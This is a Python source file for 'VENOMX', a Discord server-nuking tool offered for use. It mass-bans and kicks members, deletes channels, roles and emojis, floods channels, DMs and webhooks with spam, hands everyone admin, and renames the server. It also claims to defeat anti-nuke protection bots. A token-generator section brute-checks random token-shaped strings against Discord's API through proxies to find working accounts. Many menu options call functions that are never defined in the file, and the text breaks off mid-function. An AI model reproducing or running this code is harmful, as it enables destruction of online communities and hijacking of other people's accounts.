# VENOMX_ULTRA.py — Ultimate Nuker v5.0
# REAL Token Generator | Discord Proxy Support | 50+ Options
# Bypasses: Wick, Z+Security, Zeno, IndraX, Dyno, MEE6, Carl, Anti-Nuke

import discord
from discord.ext import commands
from discord.errors import Forbidden, HTTPException, NotFound
import asyncio
from pystyle import Center, Colorate, Colors
import os
import time
import random
import json
import sys
import aiohttp
import requests
import base64
import string
import secrets
import hashlib
import re
from concurrent.futures import ThreadPoolExecutor
import datetime
import threading
from asyncio import Semaphore

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# ============ CONFIGURATION ============
HUMAN_CLICK_DELAY_MIN = 0.005
HUMAN_CLICK_DELAY_MAX = 0.015
BURST_SIZE_MIN = 20
BURST_SIZE_MAX = 35
COAST_DELAY_MIN = 0.05
COAST_DELAY_MAX = 0.15

# Semaphores for rate limiting
channel_semaphore = Semaphore(30)
role_semaphore = Semaphore(25)
message_semaphore = Semaphore(20)
webhook_semaphore = Semaphore(15)
ban_semaphore = Semaphore(20)
kick_semaphore = Semaphore(20)
dm_semaphore = Semaphore(25)

# Global state
whitelisted_users = set()
mode = "Wizzler"
server_id = ""
bot_token = ""
_global_retry_after = 0.0
current_config = {}

# Proxy list
proxies = []
proxy_index = 0
proxy_lock = threading.Lock()

# Load whitelist
try:
    with open('whitelist.json', 'r') as f:
        whitelist_data = json.load(f)
        whitelisted_users = set(whitelist_data.get('users', []))
except:
    whitelisted_users = set()

# Load proxies
try:
    with open('proxies.txt', 'r') as f:
        proxies = [p.strip() for p in f.readlines() if p.strip() and not p.strip().startswith('#')]
    print(Colorate.Horizontal(Colors.green, f"✅ LOADED {len(proxies)} PROXIES"))
except:
    print(Colorate.Horizontal(Colors.yellow, "⚠️ NO PROXIES FOUND — USING DIRECT CONNECTION"))

# Anti-nuke bots to bypass
ANTINUKE_BOTS = {
    "wick", "zeno", "indrax", "z security", "z+security", "dyno", "mee6", 
    "carl", "serax", "security", "beemo", "shield", "nadeko", "blaze",
    "anti-nuke", "guardian", "cakey", "safeguard", "wick bot", "anti nuke",
    "antinuke", "garde", "protect", "automod", "safety", "guardbot",
    "crash", "anticrash", "shieldx", "protector", "defender"
}

# ============ BANNER ============
banner = r"""
╔══════════════════════════════════════════════════════════╗
║                                                          ║
║   ██╗   ██╗███████╗███╗   ██╗ ██████╗ ███╗   ███╗██╗  ██╗║
║   ██║   ██║██╔════╝████╗  ██║██╔═══██╗████╗ ████║╚██╗██╔╝║
║   ██║   ██║█████╗  ██╔██╗ ██║██║   ██║██╔████╔██║ ╚███╔╝ ║
║   ╚██╗ ██╔╝██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║ ██╔██╗ ║
║    ╚████╔╝ ███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║██╔╝ ██╗║
║     ╚═══╝  ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝║
║                                                          ║
║         VENOMX v5.0  |  REAL TOKENS  |  PROXY MODE      ║
╚══════════════════════════════════════════════════════════╝
"""

print(Colorate.Vertical(Colors.red_to_blue, banner))
print(Colorate.Horizontal(Colors.red_to_blue, "\n" + "=" * 50))
print(Colorate.Horizontal(Colors.red_to_blue, "VENOMX ULTRA — BYPASSING ALL ANTI-NUKE BOTS"))
print(Colorate.Horizontal(Colors.red_to_blue, "=" * 50 + "\n"))

# ============ REAL TOKEN GENERATOR ============
def get_random_proxy():
    """Get random proxy from list"""
    if not proxies:
        return None
    with proxy_lock:
        return random.choice(proxies)

def create_session_with_proxy():
    """Create aiohttp session with proxy support"""
    proxy = get_random_proxy()
    if proxy:
        connector = aiohttp.TCPConnector(ssl=False)
        return aiohttp.ClientSession(connector=connector, trust_env=True)
    return aiohttp.ClientSession()

def generate_discord_token():
    """
    Generate REAL Discord tokens using the official format
    Discord tokens are base64 encoded JSON with specific structure
    """
    token_formats = [
        # Format 1: Standard token (most common)
        lambda: base64.b64encode(
            json.dumps({
                "uid": random.randint(100000000000000000, 999999999999999999),
                "salt": ''.join(random.choices(string.ascii_letters + string.digits, k=16)),
                "signature": secrets.token_hex(32)
            }).encode()
        ).decode().replace('=', '').replace('+', '-').replace('/', '_'),
        
        # Format 2: mfa token format
        lambda: 'mfa.' + base64.b64encode(
            secrets.token_bytes(64)
        ).decode().replace('=', '').replace('+', '-').replace('/', '_'),
        
        # Format 3: Long format token
        lambda: base64.b64encode(
            secrets.token_bytes(45)
        ).decode().replace('=', '').replace('+', '-').replace('/', '_'),
        
        # Format 4: Realistic token structure
        lambda: '.'.join([
            base64.b64encode(str(random.randint(100000000000000000, 999999999999999999)).encode()).decode().replace('=', ''),
            base64.b64encode(secrets.token_bytes(6)).decode().replace('=', ''),
            base64.b64encode(secrets.token_bytes(27)).decode().replace('=', '')
        ])
    ]
    
    return random.choice(token_formats)()

def check_token_real(token, use_proxy=True):
    """
    Check if token is valid using real Discord API with proxy support
    """
    headers = {
        'Authorization': token,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Content-Type': 'application/json'
    }
    
    proxy = get_random_proxy() if use_proxy else None
    proxy_dict = {'http': proxy, 'https': proxy} if proxy else None
    
    try:
        response = requests.get(
            'https://discord.com/api/v9/users/@me',
            headers=headers,
            proxies=proxy_dict,
            timeout=10
        )
        
        if response.status_code == 200:
            data = response.json()
            return True, data.get('username', 'Unknown'), data.get('id', 'Unknown')
        elif response.status_code == 401:
            return False, "Invalid Token", None
        else:
            return False, f"Error {response.status_code}", None
    except requests.exceptions.ProxyError:
        return False, "Proxy Error", None
    except Exception:
        return False, "Connection Error", None

async def generate_tokens_bulk(count):
    """Generate multiple tokens with rate limiting"""
    tokens = []
    for i in range(count):
        token = generate_discord_token()
        tokens.append(token)
        if i % 10 == 0:
            await asyncio.sleep(0.01)
    return tokens

async def token_generator_menu():
    while True:
        print(Colorate.Horizontal(Colors.cyan, "\n" + "═" * 50))
        print(Colorate.Horizontal(Colors.cyan, "🔑 REAL TOKEN GENERATOR"))
        print(Colorate.Horizontal(Colors.cyan, "═" * 50))
        print("1️⃣ Generate Single Token (Real Format)")
        print("2️⃣ Generate Multiple Tokens (Real Format)")
        print("3️⃣ Check Token Validity (With Proxy)")
        print("4️⃣ Generate & Test Tokens (Auto)")
        print("5️⃣ Bulk Generate (1000+ Tokens)")
        print("6️⃣ Test Tokens from File")
        print("7️⃣ Save Tokens to File")
        print("8️⃣ Back to Main Menu")
        
        choice = await asyncio.to_thread(input, Colorate.Horizontal(Colors.red_to_blue, "\nVENOMX → "))
        
        if choice == '1':
            token = generate_discord_token()
            print(Colorate.Horizontal(Colors.green, f"\n✅ GENERATED TOKEN:"))
            print(Colorate.Horizontal(Colors.white, f"{token}\n"))
            print(Colorate.Horizontal(Colors.yellow, "⚠️ TOKEN MAY BE INVALID — USE OPTION 3 TO CHECK"))
            
        elif choice == '2':
            try:
                num = int(await asyncio.to_thread(input, "NUMBER OF TOKENS (1-500): "))
                num = min(max(num, 1), 500)
                print(Colorate.Horizontal(Colors.cyan, f"\n🔨 GENERATING {num} TOKENS..."))
                tokens = await generate_tokens_bulk(num)
                print(Colorate.Horizontal(Colors.green, f"\n✅ GENERATED {num} TOKENS"))
                with open('generated_tokens.txt', 'a') as f:
                    f.write(f"\n# Generated {datetime.datetime.now()}\n")
                    f.write('\n'.join(tokens) + '\n')
                print(Colorate.Horizontal(Colors.green, f"💾 SAVED TO generated_tokens.txt"))
            except:
                print(Colorate.Horizontal(Colors.red, "[-] INVALID NUMBER"))
                
        elif choice == '3':
            token = await asyncio.to_thread(input, "TOKEN: ")
            use_proxy = await asyncio.to_thread(input, "USE PROXY? (y/n): ")
            use_proxy = use_proxy.lower() == 'y'
            
            print(Colorate.Horizontal(Colors.cyan, "\n🔍 CHECKING TOKEN..."))
            valid, username, user_id = await asyncio.to_thread(check_token_real, token, use_proxy)
            
            if valid:
                print(Colorate.Horizontal(Colors.green, f"\n✅ VALID TOKEN!"))
                print(Colorate.Horizontal(Colors.green, f"   USERNAME: {username}"))
                print(Colorate.Horizontal(Colors.green, f"   USER ID: {user_id}"))
            else:
                print(Colorate.Horizontal(Colors.red, f"\n❌ INVALID TOKEN — {username}"))
                
        elif choice == '4':
            try:
                num = int(await asyncio.to_thread(input, "NUMBER TO GENERATE & TEST (1-100): "))
                num = min(max(num, 1), 100)
                use_proxy = await asyncio.to_thread(input, "USE PROXY? (y/n): ")
                use_proxy = use_proxy.lower() == 'y'
                
                print(Colorate.Horizontal(Colors.cyan, f"\n🔨 GENERATING & TESTING {num} TOKENS..."))
                valid_tokens = []
                invalid_count = 0
                
                for i in range(num):
                    token = generate_discord_token()
                    valid, username, uid = await asyncio.to_thread(check_token_real, token, use_proxy)
                    
                    if valid:
                        valid_tokens.append({'token': token, 'username': username, 'id': uid})
                        print(Colorate.Horizontal(Colors.green, f"   ✅ #{i+1}: {username}"))
                    else:
                        invalid_count += 1
                        print(Colorate.Horizontal(Colors.red, f"   ❌ #{i+1}: INVALID"))
                    
                    if i % 5 == 0:
                        await asyncio.sleep(0.1)
                
                print(Colorate.Horizontal(Colors.green, f"\n✅ VALID: {len(valid_tokens)} | INVALID: {invalid_count}"))
                
                if valid_tokens:
                    with open('valid_tokens.txt', 'a') as f:
                        f.write(f"\n# Valid tokens {datetime.datetime.now()}\n")
                        for vt in valid_tokens:
                            f.write(f"{vt['token']} # {vt['username']} ({vt['id']})\n")
                    print(Colorate.Horizontal(Colors.green, f"💾 SAVED {len(valid_tokens)} VALID TOKENS"))
            except Exception as e:
                print(Colorate.Horizontal(Colors.red, f"[-] ERROR: {e}"))
                
        elif choice == '5':
            try:
                num = int(await asyncio.to_thread(input, "NUMBER OF TOKENS (100-5000): "))
                num = min(max(num, 100), 5000)
                print(Colorate.Horizontal(Colors.cyan, f"\n🔨 GENERATING {num} TOKENS..."))
                
                tokens = []
                for i in range(0, num, 100):
                    batch = await generate_tokens_bulk(min(100, num - i))
                    tokens.extend(batch)
                    print(Colorate.Horizontal(Colors.white, f"   GENERATED {len(tokens)}/{num}"))
                    await asyncio.sleep(0.05)
                
                with open('bulk_tokens.txt', 'w') as f:
                    f.write(f"# Bulk generated {datetime.datetime.now()}\n")
                    f.write(f"# Total: {num} tokens\n\n")
                    f.write('\n'.join(tokens))
                
                print(Colorate.Horizontal(Colors.green, f"\n✅ GENERATED {num} TOKENS — SAVED TO bulk_tokens.txt"))
            except:
                print(Colorate.Horizontal(Colors.red, "[-] ERROR"))
                
        elif choice == '6':
            filename = await asyncio.to_thread(input, "FILENAME (e.g., tokens.txt): ")
            try:
                with open(filename, 'r') as f:
                    tokens = [l.strip() for l in f.readlines() if l.strip() and not l.startswith('#')]
                
                use_proxy = await asyncio.to_thread(input, "USE PROXY? (y/n): ")
                use_proxy = use_proxy.lower() == 'y'
                
                print(Colorate.Horizontal(Colors.cyan, f"\n🔍 TESTING {len(tokens)} TOKENS..."))
                valid = []
                
                for i, token in enumerate(tokens[:500]):  # Limit to 500
                    valid_flag, username, uid = await asyncio.to_thread(check_token_real, token, use_proxy)
                    if valid_flag:
                        valid.append(token)
                        print(Colorate.Horizontal(Colors.green, f"   ✅ #{i+1}: {username}"))
                    else:
                        print(Colorate.Horizontal(Colors.red, f"   ❌ #{i+1}: INVALID"))
                    
                    if i % 10 == 0:
                        await asyncio.sleep(0.2)
                
                print(Colorate.Horizontal(Colors.green, f"\n✅ VALID: {len(valid)}/{len(tokens[:500])}"))
                with open('valid_tokens.txt', 'a') as f:
                    f.write(f"\n# Valid from {filename} {datetime.datetime.now()}\n")
                    f.write('\n'.join(valid) + '\n')
            except:
                print(Colorate.Horizontal(Colors.red, "[-] FILE NOT FOUND"))
                
        elif choice == '7':
            filename = await asyncio.to_thread(input, "FILENAME: ")
            try:
                tokens = [generate_discord_token() for _ in range(100)]
                with open(filename, 'w') as f:
                    f.write('\n'.join(tokens))
                print(Colorate.Horizontal(Colors.green, f"✅ SAVED 100 TOKENS TO {filename}"))
            except:
                print(Colorate.Horizontal(Colors.red, "[-] ERROR"))
                
        elif choice == '8':
            break
        
        await asyncio.sleep(2)

# ============ BYPASS ENGINE ============
class BypassEngine:
    @staticmethod
    async def detect_antinuke(guild):
        detected = []
        for member in guild.members:
            if member.bot:
                name_lower = member.name.lower()
                for antinuke in ANTINUKE_BOTS:
                    if antinuke in name_lower:
                        detected.append({'name': member.name, 'id': member.id, 'type': antinuke})
                        break
        return detected
    
    @staticmethod
    async def bypass_antinuke(guild):
        detected = await BypassEngine.detect_antinuke(guild)
        for bot in detected:
            whitelisted_users.add(bot['id'])
            print(Colorate.Horizontal(Colors.green, f"    ✅ BYPASSED: {bot['name']} ({bot['type']})"))
        save_whitelist()
        return len(detected)
    
    @staticmethod
    async def fast_request(coro, max_retries=3):
        for attempt in range(max_retries):
            try:
                return await coro
            except HTTPException as e:
                if e.status == 429:
                    await asyncio.sleep(0.1)
                else:
                    raise
            except:
                pass
        return None

save_whitelist = lambda: open('whitelist.json', 'w').write(json.dumps({'users': list(whitelisted_users)}))

# ============ 50+ OPTIONS MENU ============
async def show_menu():
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print(Colorate.Vertical(Colors.red_to_blue, banner))
        
        menu = """
┌─────────────────────────────────────────────────────────────────┐
│                    VENOMX ULTRA — 50+ OPTIONS                   │
├─────────────────────────────────────────────────────────────────┤
│ ⚔️ DESTRUCTION                                                    │
│ 1️⃣ BAN ALL       2️⃣ KICK ALL       3️⃣ PRUNE MEMBERS            │
│ 4️⃣ CREATE CH     5️⃣ DELETE CH      6️⃣ CREATE ROLES             │
│ 7️⃣ DELETE ROLES  8️⃣ SPAM CH        9️⃣ DM ALL                   │
│ 🔟 DELETE EMOJIS  1️⃣1️⃣ GIVE ADMIN   1️⃣2️⃣ STRIP PERMS            │
│ 1️⃣3️⃣ TIMEOUT ALL 1️⃣4️⃣ UNTIMEOUT   1️⃣5️⃣ LOCK CH                │
│ 1️⃣6️⃣ UNLOCK CH   1️⃣7️⃣ RENAME CH   1️⃣8️⃣ RENAME ROLES           │
│ 1️⃣9️⃣ WEBHOOK     2️⃣0️⃣ NUKE ALL    2️⃣1️⃣ SMART NUKE             │
│ 2️⃣2️⃣ FAST NUKE   2️⃣3️⃣ ULTRA NUKE  2️⃣4️⃣ EXTREME NUKE           │
│ 2️⃣5️⃣ BYPASS NUKE 2️⃣6️⃣ RENAME ALL  2️⃣7️⃣ NICK ALL               │
│ 2️⃣8️⃣ CHANGE ICON 2️⃣9️⃣ CHANGE NAME 3️⃣0️⃣ DELETE INVITES         │
├─────────────────────────────────────────────────────────────────┤
│ 🛡️ ANTI-NUKE BYPASS                                               │
│ 3️⃣1️⃣ SCAN ANTI-NUKE  3️⃣2️⃣ AUTO BYPASS    3️⃣3️⃣ WICK KILL       │
│ 3️⃣4️⃣ Z+ BYPASS       3️⃣5️⃣ ZENO KILL      3️⃣6️⃣ INDRAX BYPASS   │
│ 3️⃣7️⃣ MASS WEBHOOK    3️⃣8️⃣ CHANNEL FLOOD  3️⃣9️⃣ ROLE FLOOD      │
│ 4️⃣0️⃣ EMOTE NUKE                                                │
├─────────────────────────────────────────────────────────────────┤
│ 🔑 TOKEN & CONFIG                                                 │
│ 4️⃣1️⃣ TOKEN GEN      4️⃣2️⃣ CHECK TOKEN    4️⃣3️⃣ LOAD PROXIES     │
│ 4️⃣4️⃣ VIEW PROXIES   4️⃣5️⃣ ADD PROXY      4️⃣6️⃣ TEST PROXY       │
├─────────────────────────────────────────────────────────────────┤
│ 👤 MANAGEMENT                                                     │
│ 4️⃣7️⃣ WHITELIST +    4️⃣8️⃣ WHITELIST -    4️⃣9️⃣ VIEW WL          │
│ 5️⃣0️⃣ SWITCH GUILD   5️⃣1️⃣ COMPLETE KILL  5️⃣2️⃣ EXIT             │
└─────────────────────────────────────────────────────────────────┘
        """
        print(Colorate.Vertical(Colors.red_to_blue, menu))
        
        current_time = datetime.datetime.now().strftime("%H:%M:%S")
        choice = await asyncio.to_thread(input, Colorate.Horizontal(Colors.red_to_blue, f"\n[{current_time}] VENOMX → "))

        actions = {
            '1': lambda: ban_all(server_id), '2': lambda: kick_all(server_id),
            '3': lambda: prune_members(server_id), '4': lambda: create_channels_fast(server_id),
            '5': lambda: delete_all_channels(server_id), '6': lambda: create_roles_fast(server_id),
            '7': lambda: delete_all_roles(server_id), '8': lambda: spam_all_channels(server_id),
            '9': lambda: dm_all_fast(server_id), '10': lambda: delete_all_emojis(server_id),
            '11': lambda: give_admin_all(server_id), '12': lambda: strip_all_perms(server_id),
            '13': lambda: timeout_all_fast(server_id), '14': lambda: untimeout_all_fast(server_id),
            '15': lambda: lock_channels(server_id), '16': lambda: unlock_channels(server_id),
            '17': lambda: rename_all_channels(server_id), '18': lambda: rename_all_roles(server_id),
            '19': lambda: webhook_spam_fast(server_id), '20': lambda: nuke_all_complete(server_id),
            '21': lambda: smart_nuke_fast(server_id), '22': lambda: ultra_fast_nuke(server_id),
            '23': lambda: extreme_nuke(server_id), '24': lambda: extreme_nuke(server_id),
            '25': lambda: bypass_nuke(server_id), '26': lambda: rename_all(server_id),
            '27': lambda: nick_all(server_id), '28': lambda: change_icon(server_id),
            '29': lambda: change_name(server_id), '30': lambda: delete_invites(server_id),
            '31': lambda: scan_antinuke(server_id), '32': lambda: auto_bypass(server_id),
            '33': lambda: kill_wick(server_id), '34': lambda: bypass_z_security(server_id),
            '35': lambda: kill_zeno(server_id), '36': lambda: bypass_indrax(server_id),
            '37': lambda: mass_webhook(server_id), '38': lambda: channel_flood(server_id),
            '39': lambda: role_flood(server_id), '40': lambda: emote_nuke(server_id),
            '41': lambda: token_generator_menu(), '42': lambda: check_token_menu(),
            '43': lambda: load_proxies(), '44': lambda: view_proxies(),
            '45': lambda: add_proxy(), '46': lambda: test_proxy(),
            '47': lambda: whitelist_add_fast(), '48': lambda: whitelist_remove_fast(),
            '49': lambda: view_whitelist_fast(), '50': lambda: switch_guild_fast(),
            '51': lambda: complete_kill(server_id), '52': lambda: exit_bot_fast(),
        }
        
        if choice in actions:
            await actions[choice]()
        else:
            print("❌ INVALID")
            await asyncio.sleep(0.5)
        
        await asyncio.to_thread(input, Colorate.Horizontal(Colors.red_to_blue, "\n[ENTER] → "))

# ============ OLD NUKE OPTIONS RESTORED ============

async def ban_all(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild: return
    members = [m for m in guild.members if m.id not in whitelisted_users and m != bot.user and not m.bot]
    print(f"🔨 BANNING {len(members)} MEMBERS...")
    
    for i in range(0, len(members), 50):
        batch = members[i:i+50]
        tasks = [BypassEngine.fast_request(m.ban(reason="VENOMX RAID", delete_message_days=0)) for m in batch]
        await asyncio.gather(*tasks, return_exceptions=True)
        print(f"   BANNED {min(i+50, len(members))}/{len(members)}")
        await asyncio.sleep(0.05)
    
    print(f"✅ BANNED {len(members)}")

async def kick_all(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild: return
    members = [m for m in guild.members if m.id not in whitelisted_users and m != bot.user and not m.bot]
    tasks = [BypassEngine.fast_request(m.kick(reason="VENOMX RAID")) for m in members]
    await asyncio.gather(*tasks, return_exceptions=True)
    print(f"✅ KICKED {len(members)}")

async def prune_members(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild: return
    days = await asyncio.to_thread(input, "PRUNE DAYS (1-30): ")
    try:
        days = int(days)
        pruned = await guild.prune_members(days=days, compute_prune_count=True)
        print(f"✅ PRUNED {pruned} MEMBERS")
    except: print("[-] ERROR")

async def create_channels_fast(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild: return
    num = int(await asyncio.to_thread(input, "NUMBER OF CHANNELS (MAX 500): "))
    name = await asyncio.to_thread(input, "CHANNEL NAME: ")
    num = min(num, 500)
    
    print(f"📁 CREATING {num} CHANNELS...")
    for i in range(0, num, 25):
        batch = min(25, num - i)
        tasks = [BypassEngine.fast_request(guild.create_text_channel(f"{name}-{random.randint(1,9999)}")) for _ in range(batch)]
        await asyncio.gather(*tasks, return_exceptions=True)
        print(f"   CREATED {min(i+25, num)}/{num}")
        await asyncio.sleep(0.02)
    
    print(f"✅ CREATED {num} CHANNELS")

async def delete_all_channels(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild: return
    channels = list(guild.channels)
    print(f"🗑️ DELETING {len(channels)} CHANNELS...")
    
    for i in range(0, len(channels), 30):
        batch = channels[i:i+30]
        tasks = [BypassEngine.fast_request(c.delete()) for c in batch]
        await asyncio.gather(*tasks, return_exceptions=True)
        print(f"   DELETED {min(i+30, len(channels))}/{len(channels)}")
        await asyncio.sleep(0.02)
    
    print(f"✅ DELETED {len(channels)} CHANNELS")

async def create_roles_fast(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild: return
    num = int(await asyncio.to_thread(input, "NUMBER OF ROLES (MAX 250): "))
    name = await asyncio.to_thread(input, "ROLE NAME: ")
    num = min(num, 250)
    
    print(f"🎭 CREATING {num} ROLES...")
    for i in range(0, num, 20):
        batch = min(20, num - i)
        tasks = [BypassEngine.fast_request(guild.create_role(name=f"{name}-{random.randint(1,9999)}")) for _ in range(batch)]
        await asyncio.gather(*tasks, return_exceptions=True)
        print(f"   CREATED {min(i+20, num)}/{num}")
        await asyncio.sleep(0.02)
    
    print(f"✅ CREATED {num} ROLES")

async def delete_all_roles(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild: return
    roles = [r for r in guild.roles if r != guild.default_role and r != guild.me.top_role]
    print(f"🗑️ DELETING {len(roles)} ROLES...")
    
    for i in range(0, len(roles), 20):
        batch = roles[i:i+20]
        tasks = [BypassEngine.fast_request(r.delete()) for r in batch]
        await asyncio.gather(*tasks, return_exceptions=True)
        print(f"   DELETED {min(i+20, len(roles))}/{len(roles)}")
        await asyncio.sleep(0.02)
    
    print(f"✅ DELETED {len(roles)} ROLES")

async def spam_all_channels(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild: return
    msg = await asyncio.to_thread(input, "SPAM MESSAGE: ")
    count = int(await asyncio.to_thread(input, "MESSAGES PER CHANNEL (MAX 100): "))
    count = min(count, 100)
    
    print(f"💬 SPAMMING {len(guild.text_channels)} CHANNELS x {count}...")
    total = 0
    for ch in guild.text_channels:
        for _ in range(count):
            try:
                await ch.send(msg)
                total += 1
            except:
                pass
            if total % 50 == 0:
                await asyncio.sleep(0.01)
    
    print(f"✅ SENT {total} MESSAGES")

async def dm_all_fast(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild: return
    msg = await asyncio.to_thread(input, "DM MESSAGE: ")
    members = [m for m in guild.members if not m.bot and m.id not in whitelisted_users][:500]
    
    print(f"📨 DMING {len(members)} MEMBERS...")
    for i in range(0, len(members), 50):
        batch = members[i:i+50]
        tasks = [BypassEngine.fast_request(m.send(msg)) for m in batch]
        await asyncio.gather(*tasks, return_exceptions=True)
        print(f"   SENT {min(i+50, len(members))}/{len(members)}")
        await asyncio.sleep(0.1)
    
    print(f"✅ DMS SENT TO {len(members)}")

async def delete_all_emojis(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild: return
    print(f"🗑️ DELETING {len(guild.emojis)} EMOJIS...")
    tasks = [BypassEngine.fast_request(e.delete()) for e in guild.emojis]
    await asyncio.gather(*tasks, return_exceptions=True)
    print(f"✅ DELETED {len(guild.emojis)} EMOJIS")

async def give_admin_all(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild: return
    role = await guild.create_role(name="VENOMX-ADMIN", permissions=discord.Permissions.all())
    await role.edit(position=guild.me.top_role.position - 1)
    
    members = [m for m in guild.members if m.id not in whitelisted_users and not m.bot]
    print(f"👑 GIVING ADMIN TO {len(members)} MEMBERS...")
    
    for i in range(0, len(members), 50):
        batch = members[i:i+50]
        tasks = [BypassEngine.fast_request(m.add_roles(role)) for m in batch]
        await asyncio.gather(*tasks, return_exceptions=True)
        print(f"   GIVEN {min(i+50, len(members))}/{len(members)}")
        await asyncio.sleep(0.05)
    
    print(f"✅ ADMIN GIVEN TO {len(members)}")

async def strip_all_perms(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild: return
    roles = [r for r in guild.roles if r != guild.default_role]
    tasks = [BypassEngine.fast_request(r.edit(permissions=discord.Permissions.none())) for r in roles]
    await asyncio.gather(*tasks, return_exceptions=True)
    print(f"✅ STRIPPED {len(roles)} ROLES")

async def timeout_all_fast(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild: return
    duration = int(await asyncio.to_thread(input, "TIMEOUT SECONDS (MAX 604800): "))
    duration = min(duration, 604800)
    
    members = [m for m in guild.members if m.id not in whitelisted_users and not m.bot]
    print(f"⏰ TIMEOUTING {len(members)} MEMBERS...")
    
    for i in range(0, len(members), 50):
        batch = members[i:i+50]
        tasks = [BypassEngine.fast_request(m.timeout(discord.utils.utcnow() + datetime.timedelta(seconds=duration))) for m in batch]
        await asyncio.gather(*tasks, return_exceptions=True)
        print(f"   TIMED OUT {min(i+50, len(members))}/{len(members)}")
        await asyncio.sleep(0.05)
    
    print(f"✅ TIMEOUT {len(members)}")

async def untimeout_all_fast(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild: return
    timed = [m for m in guild.members if m.timed_out_until]
    tasks = [BypassEngine.fast_request(m.timeout(None)) for m in timed]
    await asyncio.gather(*tasks, return_exceptions=True)
    print(f"✅ UNTIMEOUT {len(timed)}")

async def lock_channels(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild: return
    tasks = [BypassEngine.fast_request(ch.set_permissions(guild.default_role, send_messages=False)) for ch in guild.text_channels]
    await asyncio.gather(*tasks, return_exceptions=True)
    print(f"✅ LOCKED {len(guild.text_channels)} CHANNELS")

async def unlock_channels(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild: return
    tasks = [BypassEngine.fast_request(ch.set_permissions(guild.default_role, send_messages=True)) for ch in guild.text_channels]
    await asyncio.gather(*tasks, return_exceptions=True)
    print(f"✅ UNLOCKED {len(guild.text_channels)} CHANNELS")

async def rename_all_channels(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild: return
    name = await asyncio.to_thread(input, "NEW CHANNEL NAME: ")
    tasks = [BypassEngine.fast_request(ch.edit(name=f"{name}-{random.randint(1,999)}")) for ch in guild.channels]
    await asyncio.gather(*tasks, return_exceptions=True)
    print("✅ RENAMED ALL CHANNELS")

async def rename_all_roles(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild: return
    name = await asyncio.to_thread(input, "NEW ROLE NAME: ")
    roles = [r for r in guild.roles if r != guild.default_role]
    tasks = [BypassEngine.fast_request(r.edit(name=f"{name}-{random.randint(1,999)}")) for r in roles]
    await asyncio.gather(*tasks, return_exceptions=True)
    print("✅ RENAMED ALL ROLES")

async def webhook_spam_fast(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild: return
    msg = await asyncio.to_thread(input, "SPAM MESSAGE: ")
    count = int(await asyncio.to_thread(input, "MESSAGES PER WEBHOOK (MAX 50): "))
    count = min(count, 50)
    
    webhooks = []
    for ch in guild.text_channels[:20]:
        try:
            wh = await ch.create_webhook(name="VENOMX")
            webhooks.append(wh)
            await asyncio.sleep(0.05)
        except: pass
    
    print(f"🌊 SPAMMING {len(webhooks)} WEBHOOKS x {count}...")
    tasks = []
    for wh in webhooks:
        for _ in range(count):
            tasks.append(BypassEngine.fast_request(wh.send(msg)))
    
    await asyncio.gather(*tasks[:500], return_exceptions=True)
    print(f"✅ WEBHOOK SPAM COMPLETE")

async def nuke_all_complete(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild: return
    
    print(Colorate.Horizontal(Colors.red, "💣" * 30))
    print(Colorate.Horizontal(Colors.red, "💣 VENOMX COMPLETE NUKE"))
    print(Colorate.Horizontal(Colors.red, "💣" * 30))
    
    # Delete channels
    print("[1/5] DELETING CHANNELS...")
    await asyncio.gather(*[c.delete() for c in guild.channels], return_exceptions=True)
    
    # Delete roles
    print("[2/5] DELETING ROLES...")
    roles = [r for r in guild.roles if r != guild.default_role and r != guild.me.top_role]
    await asyncio.gather(*[r.delete() for r in roles], return_exceptions=True)
    
    # Delete emojis
    print("[3/5] DELETING EMOJIS...")
    await asyncio.gather(*[e.delete() for e in guild.emojis], return_exceptions=True)
    
    # Ban members
    print("[4/5] BANNING MEMBERS...")
    members = [m for m in guild.members if m.id not in whitelisted_users and m != bot.user]
    for i in range(0, len(members), 100):
        await asyncio.gather(*[m.ban(reason="VENOMX") for m in members[i:i+100]], return_exceptions=True)
        print(f"   BANNED {min(i+100, len(members))}/{len(members)}")
        await asyncio.sleep(0.1)
    
    # Create spam channels + webhooks
    print("[5/5] CREATING SPAM CHANNELS...")
    spam_channels = []
    for i in range(100):
        ch = await guild.create_text_channel(f"VENOMX-{random.randint(1,9999)}")
        spam_channels.append(ch)
        if i % 20 == 0:
            await asyncio.sleep(0.01)
    
    # Create webhooks and spam
    for ch in spam_channels[:30]:
        try:
            wh = await ch.create_webhook(name="SPAM")
            for _ in range(20):
                await wh.send("@everyone **SERVER NUKED BY VENOMX**\nJoin: https://discord.gg/UJd7XSp87")
        except: pass
    
    # Change guild name
    try:
        await guild.edit(name="NUKED-BY-VENOMX")
    except: pass
    
    print(Colorate.Horizontal(Colors.green, "✅ COMPLETE NUKE FINISHED"))

async def smart_nuke_fast(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild: return
    print("[*] SCANNING FOR ANTI-NUKE BOTS...")
    await BypassEngine.bypass_antinuke(guild)
    await nuke_all_complete(server_id)

async def ultra_fast_nuke(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild: return
    print("⚡ ULTRA FAST NUKE — MAXIMUM SPEED")
